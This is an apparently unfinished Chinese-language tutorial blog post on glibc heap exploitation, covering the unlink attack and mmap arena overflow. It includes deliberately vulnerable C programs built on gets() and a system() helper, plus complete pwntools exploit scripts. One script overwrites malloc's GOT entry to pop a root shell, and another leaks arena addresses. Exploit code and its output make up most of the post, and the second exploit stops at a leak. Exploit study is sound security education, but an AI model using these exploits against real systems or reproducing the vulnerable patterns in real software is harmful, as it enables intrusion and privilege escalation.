---
layout: post
title: heap教程(二)
excerpt: "heap教程之unlink和mmap"
categories: [未完待续]
comments: true
---

#### Unlink
非fastbinchunk在free的时候,会检查前后是否是freed,然后合并freed.

通过pre_size进入到前一个chunk,然后将这个chunk从它的double-link list中unlink,unlink操作如下
```c
#define unlink(P,BK,FD){
	FD = P ->fd;
	BK = P ->bk;
	if (FD->bk ! = P || BK -> fd != P)							//对前一个chunk进行检查,double link list指过去的那个chunk,是否指回来
		malloc_printerr (check_action,"corrupted d...",P);
	else{
		FD ->bk = BK;
		BK ->fd = FD;
	}
}
```
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	void *p = malloc(130);//非fastbin,大于120
	void *q = malloc(130);
	void *r = malloc(130);
	free(p);
	free(q);
}
```
overwrite heap pointer
```c
p ->fd =&p -0x18
p ->bk =&p -0x10
```
结果`p = &p - 0x18`,就是unlink操作让这个指针指向了它的前24个byte的地方

漏洞代码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* cmd;			//指针

void sh(char *c){
	system(c);
}

int main(){
	char* ptr[8];		//8个长度为8的指针
	int size,n;
	
	setvbuf(stdout,0,_IONBF,0);
	memset(ptr,0,sizeof(ptr));		//指针置零
	cmd = malloc(128);
	
	while(1){
		fgets(cmd,128,stdin);			//输入写到指针位置
		if (!strncmp(cmd,"add",3)){		//前三个字节是否是add
			printf("Index: ");
			scanf("%d",&n);				//将index值写入n
			if (n>=0 && n<8){
				printf("Size: ");
				scanf("%d%*c",&size);	//将size写入size
				ptr[n] = malloc(size);
				printf("Data: ");
				gets(ptr[n]);
				
			} else{
				puts("out of bound");
			}
		} else if (!strncmp(cmd,"remove",6)){
			printf("Index: ");
			scanf("%d%*c",&n);				//将index写入index
			if (n>=0 && n<8 && ptr[n]){
				puts(ptr[n]);
				free(ptr[n]);				//free掉那个chunk
				ptr[n] = 0;					//指针置零
				
			} else {
				puts("nothing here");
			}
		} else {
			puts("unknow command");
		}
	}
	return 0;
}
```

cmd处位置如下
```
gdb-peda$ x/6gx 0x602010
0x602010:	0x000a65766f6d6572	0x0000000000000000
0x602020:	0x0000000000601090	0x0000000000601098		(fd,bk)
```
查看fd指向的那个chunk,其中的bk是否指了回来
```
gdb-peda$ x/4gx 0x0000000000601090
0x601090 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dd82a0	0x00007ffff7dd84e0
0x6010a0 <completed.6355>:	0x0000000000000000	0x0000000000602010
```
再查看bk指向的那个chunk,其中的fd是否指了回来
```
gdb-peda$ x/4gx 0x0000000000601098
0x601098 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dd84e0	0x0000000000000000
0x6010a8 <cmd>:	0x0000000000602010	0x0000000000000000
```
发现此时可以满足unlink条件,unlink操作之后&p指向了它的前24个byte地址处,然后我们通过fget再次覆盖&p,使它指向malloc,其中malloc地址如下
```
gdb-peda$ x/4i 0x400780
   0x400780 <malloc@plt>:	jmp    QWORD PTR [rip+0x2008e2]        # 	
   0x400786 <malloc@plt+6>:	push   0xa
   0x40078b <malloc@plt+11>:	jmp    0x4006d0
```
fget地址
```
0x400750 <fgets@plt>:	jmp    QWORD PTR [rip+0x2008fa]        # 0x601050
   0x400756 <fgets@plt+6>:	push   0x7
   0x40075b <fgets@plt+11>:	jmp    0x4006d0
```
最终exp
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']   #程序在在tmux中运行,

def add(index,size,data):
    p.sendline('add')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Data: ')
    p.sendline(data)

def remove(index):
    p.sendline('remove')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvline()

cmd = 0x600f48                  #指针位置,指向了buf
p = process('./unlinkmorty')
raw_input('#')
add(0,128,"A"*100)
add(1,128,"B"*100)
remove(0)
p.sendline("add\0AAAA"+p64(0)+p64(cmd-0x18)+p64(cmd-0x10))
p.recvuntil('Index: ')
p.sendline(str(2))
p.recvuntil('Size: ')
p.sendline(str(128))
p.recvuntil('Data: ')
p.sendline("C"*128+p64(272)+p64(0x90)+p64(0xafafafaf))     #padding+ pre_size + size + fd
remove(1)
p.sendline(p64(0x00007ffff7dd82a0)+p64(0x00007ffff7dd84e0)+p64(0)+p64(0x600f08))   #stdout,stdin,completed,&cmd     (0x600f08是malloc的前一个地址)
p.recvline()
p.sendline('add\0sh\0A'+p64(0x40086d))      #注意这里写了sh, 之后就是覆盖了malloc为sh
p.recvuntil('Index: ')
p.sendline(str(1))
p.recvuntil('Size: ')
p.sendline(str(int(0x600f0c)))          #这个就是sh的地址
p.interactive()
```
运行的结果
```bash
python exp.py 
[+] Starting local process './unlinkmorty': pid 13790
#
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```

#### mmap和arena
size超过0x21000,会改用mmap

平常使用的arena在内部的main_arena,malloc根据tls段上的指标,决定要使用的arena,mmap chunk overflow可以盖掉arena指标,我们可以伪造arena上的fastbin部分,这样下次malloc就可以获得伪造的chunk

漏洞代码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void sh(char *c){
	system(c);
}  

char cmd[1024];

int main(){
	char* ptr[8];			//8个长度为8的指针
	char magic[32];
	int size,n;
	
	setvbuf(stdout,0,_IONBF,0);
	memset(ptr,0,sizeof(ptr));		//ptr置零
	
	gets(magic);
	
	while(1){
		fgets(cmd,1024,stdin);				//从输入中读取到cmd中
		if (!strncmp(cmd,"add",3)){
			printf("Index: ");
			scanf("%d",&n);					//输入放到index
			if (n>=0 && n<8){
				printf("Size: ");
				scanf("%d%*c",&size);		//输入放到size中
				ptr[n] = malloc(size);
				printf("Data: ");
				gets(ptr[n]);				//输入放到Data中
			} else {
				puts("out of bound");
			}
		} else if (!strncmp(cmd,"print",5)){
			printf("Index: ");
			scanf("%d",&n);
			if (n>=0 && n<8 && ptr[n]){
				printf("Size: ");
				scanf("%d%*c",&size);
				write(1,ptr[n],size);
			}else {
				puts("nothing here");
			}
		} else if (!strncmp(cmd,"exit",4)){
			break;
		} else {
			puts("unknown command");
		}
	}
	return 0;		
}
```
exp
```python
from pwn import *

r = remote('127.0.0.1',4000)

def add(idx,sz,data):
    r.send('add\n')
    r.send(str(idx)+'\n')
    r.send(str(sz)+'\n')
    r.recvuntil('Data: ')
    r.send(data+'\n')

def prt(idx,sz):
    r.send('print\n')
    r.send(str(idx)+'\n')
    r.recvuntil('Size: ')
    r.send(str(sz)+'\n')
    return r.recvn(sz)

r.send(p64(0)+p64(0x72)+'\n')

cmd = 0x6010c0

add(0,0x21000,'')
z= prt(0,0x23a00)

for i in range(0,len(z),8):
    x= u64(z[i:i+8])
    if x!=0:
        print hex(i),hex(x)

r.interactive()
```
运行结果
```
python exp.py 
[+] Starting local process './arena_morty': pid 6169
0x22690 0x7fb0ee4eb060
0x22698 0x7fb0ee4eea00
0x226b0 0x7fb0ee295f60
0x226c0 0x7fb0ee295960
0x226d0 0x7fb0ee296860
0x226e0 0x7fb0ee4ea760
0x22730 0x7fb0ee6f6740
0x22738 0x7fb0ee6f7050
0x22740 0x7fb0ee6f6740
0x22758 0xc807e727c9cb8300
0x22760 0xf6b834cfc55577a
0x22a30 0x7fffcec7cc50
0x23030 0x21
0x23040 0x1
0x23050 0xffffffffffffffff
```
gdb上验证main_arena位置
```
gdb-peda$ x/gx 0x7fb0ee4ea760
0x7fb0ee4ea760 <main_arena>:	0x0000000100000000
```









